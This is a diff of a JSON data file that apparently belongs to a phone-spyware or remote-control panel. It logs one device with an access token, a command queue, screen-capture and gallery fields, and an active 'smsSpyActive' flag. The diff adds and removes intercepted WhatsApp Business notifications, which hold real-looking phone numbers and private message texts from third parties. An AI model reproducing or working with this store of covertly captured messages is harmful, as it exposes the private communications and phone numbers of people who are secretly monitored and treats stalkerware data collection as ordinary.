@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633842981,
+    "lastSeen": 1775633848954,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Santai gw tf",
+        "time": "08/04 14:37",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633849047
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "08/04 14:37",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633844876
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:22",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775632936955
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎7 pesan dari 2 chat",
-        "time": "08/04 14:22",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632936894
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "dataa gw sekarat",
-        "time": "08/04 14:22",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632936788
       }
     ],
     "galleryPhotos": [],
